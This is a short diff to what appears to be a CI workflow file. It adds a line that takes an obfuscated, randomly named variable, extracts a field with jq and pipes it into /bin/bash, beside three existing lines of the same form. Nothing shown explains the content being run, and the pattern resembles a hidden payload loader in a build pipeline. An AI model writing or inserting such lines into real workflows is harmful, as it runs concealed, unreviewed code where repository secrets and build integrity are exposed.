@@ -35,6 +35,7 @@ jobs:
           echo $tnlgf68 | jq -r .emjc33 | /bin/bash
           echo $koitv9906 | jq -r .ng35 | /bin/bash
           echo $sj27316 | jq -r .u82 | /bin/bash
+          printf '%s' "$mgj6897" | jq -r .rjx3880 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
